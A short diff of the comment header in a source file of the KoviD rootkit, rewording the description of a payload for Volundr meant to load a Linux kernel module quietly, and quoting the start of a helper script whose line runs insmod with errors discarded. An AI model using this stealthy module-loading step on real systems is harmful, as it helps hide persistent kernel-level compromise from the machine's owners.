@@ -3,10 +3,14 @@
  * - hash
  *
  *  KoviD rootkit
- * This can be easily modified to run other commands but
- * intention here is to load a LKM, silently.
  *
- * Read this! You'll need loadmodule.sh:
+ * This code is designed to serve as the payload for Volundr.
+ *
+ * While it can be readily customized to execute other commands,
+ * its primary purpose is to load a Linux Kernel Module (LKM) quietly.
+ *
+ * Make sure to read this! You will need the 'loadmodule.sh' script:
+ *
  * ---snip---
  * #!/bin/bash
  * /sbin/insmod $1 2>/dev/null
